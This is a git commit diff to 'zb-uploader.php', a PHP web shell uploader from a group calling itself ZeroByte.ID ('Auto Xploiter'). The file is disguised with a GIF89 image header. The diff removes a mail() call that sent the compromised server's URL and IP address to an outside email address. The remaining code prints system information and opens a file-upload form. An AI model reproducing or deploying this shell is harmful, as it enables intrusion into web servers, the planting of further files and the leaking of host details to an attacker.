c8f758023d5770e72d224821b561eedf812bde3a
ZeroByte.ID Warehouse <38853171+zerobyte-id@users.noreply.github.com>
2018-09-09 20:05:48 +0700

    Update zb-uploader.php

--- shell/zb-uploader.php
+++ shell/zb-uploader.php
@@ -1,5 +1,4 @@
 GIF89;a<?php
-mail("xsuxhaxdax99@gmail.com","Shell From ".$_SERVER['HTTP_HOST'],"Direct Link : ".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."\nInfo : ".$info."\nIP : ".$_SERVER['SERVER_ADDR']."\n");
 echo "ZeroByte.ID - Auto Xploiter";
 echo "<br>".php_uname()."<br>";
 echo "<form method='post' enctype='multipart/form-data'>
